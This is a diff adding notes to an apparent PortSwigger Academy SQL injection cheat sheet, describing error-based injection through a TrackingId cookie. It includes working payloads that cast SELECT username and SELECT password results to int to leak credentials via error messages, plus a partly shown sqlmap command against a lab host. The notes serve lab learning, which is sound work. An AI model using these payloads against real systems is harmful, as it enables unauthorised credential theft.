@@ -95,6 +95,19 @@ sqlmap -u https://0a90007c04bab92587b8e428007000cc.web-security-academy.net/filt
 
  <img width="743" alt="image" src="https://github.com/katvik001/PortSwigger-Academy-CheatSheets/assets/21978067/b4c242f1-a270-4742-956b-e3e7d5ee44b1">
 
+**confirms Visible error-based SQL injection by putting ' at the end of tracking ID, error is expected**
+<img width="737" alt="image" src="https://github.com/katvik001/PortSwigger-Academy-CheatSheets/assets/21978067/1079bfd6-ce5c-49f0-b857-cdf2a13150c5">
+
+**query to return only one row and for user:**
+TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
+
+<img width="740" alt="image" src="https://github.com/katvik001/PortSwigger-Academy-CheatSheets/assets/21978067/2af7161c-02f6-4304-8504-625ebbd7495f">
+
+**query to return only one row and for password:**
+' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
+
+<img width="738" alt="image" src="https://github.com/katvik001/PortSwigger-Academy-CheatSheets/assets/21978067/81e17049-fff1-4605-a26d-4f9b99bb0614">
+
 ## Summary
 
 * [Recon for SQLi Vulnerabilities](#recon)
